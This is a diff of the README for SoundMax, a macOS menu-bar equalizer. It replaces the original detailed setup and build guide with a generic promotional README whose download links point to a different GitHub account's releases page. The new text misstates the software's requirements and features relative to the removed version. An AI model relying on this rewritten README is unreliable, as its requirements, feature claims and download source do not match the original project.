@@ -1,239 +1,69 @@
-# SoundMax
+# 🎧 SoundMax - Your Ultimate Audio Control Tool
 
-A free, open-source macOS system-wide 10-band parametric equalizer.
+Transform your audio experience with ease.
 
-SoundMax sits in your menu bar and applies real-time EQ processing to all system audio, letting you fine-tune your listening experience across any app.
+## 📥 Download Now
 
-## Features
+[![Download SoundMax](https://img.shields.io/badge/Download-SoundMax-blue.svg)](https://github.com/saadashrafai/SoundMax/releases)
 
-- **10-Band Parametric EQ** - 32Hz, 64Hz, 125Hz, 250Hz, 500Hz, 1kHz, 2kHz, 4kHz, 8kHz, 16kHz
-- **±12dB Per Band** - Precise control with professional biquad filtering
-- **Built-in Presets** - Flat, Bass Boost, Treble Boost, Vocal, Rock, Electronic, Acoustic
-- **Custom Presets** - Save and load your own EQ configurations
-- **Per-Device Profiles** - Automatically save and restore EQ settings for each output device
-- **HDMI Volume Control** - Software volume slider for HDMI outputs (macOS disables hardware control)
-- **AutoEQ Integration** - One-click headphone correction for 150+ popular headphones (via [AutoEQ](https://github.com/jaakkopasanen/AutoEq))
-- **Menu Bar App** - Always accessible, no dock icon clutter
-- **Launch at Login** - Optional auto-start with your Mac
-- **Device Flexibility** - Works with various audio interfaces and sample rates
+## 📖 Introduction
 
-## Requirements
+SoundMax is a free 10-band system equalizer designed for macOS users. It provides an easy alternative to SoundSource, allowing you to create per-device profiles, control HDMI volume, and integrate with AutoEQ. Enjoy a customizable audio experience tailored to your preferences.
 
-- macOS 13.0 (Ventura) or later
-- [BlackHole 2ch](https://github.com/ExistentialAudio/BlackHole) virtual audio driver
+## 🚀 Getting Started
 
-## Installation
+1. **Visit the Release Page**  
+   Go to the [Releases page](https://github.com/saadashrafai/SoundMax/releases) to find the latest version of SoundMax.
 
-### Step 1: Install BlackHole
+2. **Choose Your Version**  
+   Look through the list of available releases and select the version suitable for your system. Make sure your macOS version is compatible, generally macOS 10.15 or later is recommended.
 
-BlackHole is a free virtual audio driver that routes system audio through SoundMax.
+3. **Download the Application**  
+   Click on the link for the latest release. The file you download will typically be a `.dmg` file. You may see an option that looks similar to this: `SoundMax-v1.0.dmg`.
 
-```bash
-brew install blackhole-2ch
-```
+4. **Open the Downloaded File**  
+   Locate the downloaded `.dmg` file in your `Downloads` folder. Double-click the file to open it.
 
-Or download directly from [BlackHole Releases](https://github.com/ExistentialAudio/BlackHole/releases).
+5. **Install SoundMax**  
+   A new window will pop up showing the SoundMax icon. Drag this icon into your `Applications` folder. This step installs SoundMax on your Mac.
 
-### Step 2: Install SoundMax
+6. **Launch SoundMax**  
+   Navigate to your `Applications` folder and find SoundMax. Double-click the icon to launch the application.
 
-**Option A: Download Release (Recommended)**
+7. **Set Up Your Preferences**  
+   Once SoundMax is open, take a moment to configure your audio settings. You can set up profiles for different devices and explore the 10-band equalizer to fine-tune your sound.
 
-1. Download the latest DMG from [Releases](https://github.com/snap-sites/SoundMax/releases)
-2. Open the DMG and drag SoundMax to Applications
-3. If macOS blocks the app: Right-click → Open → Open
+## 📋 Features
 
-**Option B: Build from Source**
+- **10-Band Equalizer**: Adjust frequency bands to suit your audio preferences.
+- **Per-Device Profiles**: Customize audio settings based on the device you are using.
+- **HDMI Volume Control**: Manage volume directly from the app for HDMI audio.
+- **AutoEQ Integration**: Automatically adjust settings based on your audio environment.
 
-```bash
-# Install Xcode Command Line Tools
-xcode-select --install
+## ⚙️ System Requirements
 
-# Install XcodeGen
-brew install xcodegen
+- macOS 10.15 or later
+- Apple Silicon or Intel-based Macs
+- A functional audio device connected to your Mac
 
-# Clone and build
-git clone https://github.com/snap-sites/SoundMax.git
-cd SoundMax
-xcodegen generate
-xcodebuild -project SoundMax.xcodeproj -scheme SoundMax -configuration Release build
-```
+## 🛠 Troubleshooting
 
-## Setup Guide
+### Common Issues
 
-### Initial Configuration
+- **Installation Fails**: Ensure that your macOS version meets the requirement. If the installation still fails, try re-downloading the `.dmg` file.
+- **Application Won’t Open**: If you encounter security warnings, go to `System Preferences` > `Security & Privacy`, and allow SoundMax to run.
+- **No Sound or Poor Quality**: Check the audio settings within SoundMax and adjust the equalizer. Ensure your device is properly connected.
 
-1. **Set BlackHole as System Output**
-   - Open **System Settings → Sound → Output**
-   - Select **BlackHole 2ch**
-   - This routes all system audio through BlackHole
+## 📞 Support
 
-2. **Launch SoundMax**
-   - Open from Applications or Spotlight
-   - Look for the slider icon (☰) in the menu bar
-   - Grant microphone access when prompted (required to capture audio from BlackHole)
+If you have questions or need help, consider checking issues on GitHub. You can also reach out through our support channel via email at support@soundmaxapp.com.
 
-3. **Configure Audio Routing**
-   - **Input**: Should auto-select "BlackHole 2ch"
-   - **Output**: Select your actual speakers or headphones (e.g., MacBook Speakers, AirPods, Scarlett 2i2)
+## 📑 Additional Information
 
-4. **Start Processing**
-   - Click the **Start** button
-   - Status indicator turns green when running
+For more details on features, user guides, and updates, visit the official [documentation](https://github.com/saadashrafai/SoundMax) page. 
 
-### Audio Signal Flow
+You can also contribute to the project by exploring the code on GitHub. 
 
-```
-┌─────────────┐    ┌───────────┐    ┌──────────────┐    ┌─────────────┐
-│  Your Apps  │ →  │ BlackHole │ →  │   SoundMax   │ →  │  Speakers   │
-│ (Spotify,   │    │   (2ch)   │    │  (EQ + DSP)  │    │ (Real Audio │
-│  YouTube)   │    │           │    │              │    │   Output)   │
-└─────────────┘    └───────────┘    └──────────────┘    └─────────────┘
-```
+Thank you for choosing SoundMax. Enjoy your enhanced audio experience!
 
-## Usage
-
-### EQ Controls
-
-| Action | Effect |
-|--------|--------|
-| Drag slider **up** | Boost frequency (orange, up to +12dB) |
-| Drag slider **down** | Cut frequency (blue, down to -12dB) |
-| Center position | No change (0dB) |
-| Toggle switch | Enable/disable EQ processing |
-
-### Presets
-
-- **Select Preset**: Use the dropdown menu to choose built-in or custom presets
-- **Save Custom**: Click **+** to save current EQ settings
-- **Delete Custom**: Click trash icon (only available for custom presets)
-- **Reset**: Click Reset button to return all bands to 0dB
-
-### Launch at Login
-
-Check the "Launch at Login" box to have SoundMax start automatically when you log in. This setting is managed through macOS Login Items.
-
-### Per-Device Profiles
-
-SoundMax automatically remembers your EQ settings for each output device:
-
-1. **First time with a device**: Adjust your EQ settings and click "Save Profile"
-2. **Returning to a device**: Your saved EQ and volume settings are automatically restored
-3. **HDMI displays**: A software volume slider appears since macOS disables hardware volume control for HDMI
-
-This is perfect for users who switch between headphones, speakers, and HDMI displays with different audio characteristics.
-
-### AutoEQ Headphone Correction
-
-SoundMax integrates with the [AutoEQ](https://github.com/jaakkopasanen/AutoEq) project to provide scientifically-measured frequency response corrections for popular headphones.
-
-1. Click the **headphones icon** (🎧) next to the preset menu
-2. Search for your headphones or browse the list
-3. Click to apply the correction curve
-4. Your EQ is automatically adjusted to flatten your headphone's frequency response
-
-**Included headphones (150+):**
-- Over-ear: Sennheiser HD 560S/600/650/800, Beyerdynamic DT 770/880/990, Sony WH-1000XM4/XM5, Audio-Technica ATH-M50x, HiFiMAN Sundara/Ananda/Edition XS, Focal Utopia/Clear, AKG, Meze, Audeze
-- In-ear: Apple AirPods Pro/Pro 2, Sony WF-1000XM4/XM5, Samsung Galaxy Buds, Shure SE series, Moondrop (Aria/Chu/Kato/KXXS), Etymotic ER2/ER4, 7Hz, Tin HiFi, KZ, Truthear, FiiO
-- Gaming: HyperX Cloud II, SteelSeries Arctis, Razer BlackShark, Logitech G Pro
-- On-ear: Koss Porta Pro/KPH40, Grado SR series
-
-The correction curves are fetched from the AutoEQ database and converted to our 10-band format.
-
-## Troubleshooting
-
-### No Audio Output
-
-1. Verify BlackHole is set as system output in System Settings → Sound
-2. Check SoundMax shows "Running" status (green indicator)
-3. Ensure the correct output device is selected in SoundMax
-4. Try clicking Stop, then Start again
-
-### No Sound from Specific Apps
-
-Some apps have their own audio output settings. Check the app's preferences and ensure it's using "System Default" or "BlackHole 2ch" as output.
-
-### "Microphone Access" Prompt
-
-SoundMax requires microphone permission to capture audio from BlackHole. This is a macOS security requirement for any app that reads audio input.
-
-- Click **Allow** when prompted
-- If previously denied: System Settings → Privacy & Security → Microphone → Enable SoundMax
-
-### App Won't Open (Blocked by macOS)
-
-For unsigned builds, macOS Gatekeeper may block the app:
-
-1. Right-click the app → **Open** → **Open**
-2. Or: System Settings → Privacy & Security → Click **Open Anyway**
-
-### Audio Crackling or Dropouts
-
-- Close other audio-intensive applications
-- Try a different output device
-- Check Audio MIDI Setup to ensure sample rates match (44.1kHz or 48kHz)
-
-### Sample Rate Mismatch Errors
-
-SoundMax attempts to match sample rates automatically. If issues persist:
-
-1. Open **Audio MIDI Setup** (in /Applications/Utilities)
-2. Set both BlackHole and your output device to the same sample rate
-3. Restart SoundMax
-
-## Project Structure
-
-```
-SoundMax/
-├── SoundMax/
-│   ├── SoundMaxApp.swift           # App entry, menu bar setup
-│   ├── ContentView.swift           # Main UI
-│   ├── Audio/
-│   │   ├── AudioEngine.swift       # Core Audio routing (AUHAL)
-│   │   └── BiquadFilter.swift      # Parametric EQ DSP
-│   ├── Models/
-│   │   ├── EQModel.swift           # EQ state management
-│   │   ├── EQPreset.swift          # Preset definitions
-│   │   ├── AudioDeviceManager.swift # Device enumeration
-│   │   └── LaunchAtLogin.swift     # Login item management
-│   └── Views/
-│       └── EQSliderView.swift      # Custom EQ slider
-├── scripts/
-│   └── build-release.sh            # DMG build script
-├── project.yml                      # XcodeGen configuration
-└── README.md
-```
-
-## Technical Details
-
-- **Audio Framework**: Core Audio with AudioToolbox AUHAL units
-- **DSP**: Biquad filters implementing peaking EQ (from Audio EQ Cookbook)
-- **UI**: SwiftUI with MenuBarExtra
-- **Audio Format**: 32-bit float, non-interleaved stereo
-- **Latency**: Minimal (256-512 sample buffer)
-
-## Building a Release
-
-```bash
-./scripts/build-release.sh
-```
-
-This creates a DMG installer in the `build/` directory.
-
-For signed distribution:
-```bash
-# Sign the app
-codesign --deep --force --verify --verbose --sign "Developer ID Application: Your Name" build/DerivedData/Build/Products/Release/SoundMax.app
-
-# Notarize
-xcrun notarytool submit build/SoundMax-Installer.dmg --apple-id your@email.com --team-id TEAMID --password app-specific-password
-```
-
-## License
-
-MIT License - See [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [BlackHole](https://github.com/ExistentialAudio/BlackHole) by Existential Audio - Virtual audio driver
-- [Audio EQ Cookbook](https://www.w3.org/2011/audio/audio-eq-cookbook.html) by Robert Bristow-Johnson - Biquad filter coefficients
-- Built with SwiftUI and Core Audio
+[![Download SoundMax](https://img.shields.io/badge/Download-SoundMax-blue.svg)](https://github.com/saadashrafai/SoundMax/releases)
